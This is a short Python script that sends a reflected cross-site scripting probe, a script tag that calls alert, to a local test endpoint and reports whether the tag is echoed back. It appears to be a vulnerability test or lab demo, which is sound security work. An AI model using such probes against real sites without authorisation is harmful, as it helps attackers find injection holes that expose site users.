import requests

def run_xss_attack():
    # Inject a simple script payload to demonstrate XSS
    payload = "<script>alert('XSS');</script>"
    url = f"http://127.0.0.1:5000/xss?input={payload}"
    response = requests.get(url)
    if payload in response.text:
        print("XSS vulnerability confirmed: script tag reflected in response")
    else:
        print("XSS test failed or vulnerability patched")

if __name__ == "__main__":
    run_xss_attack()
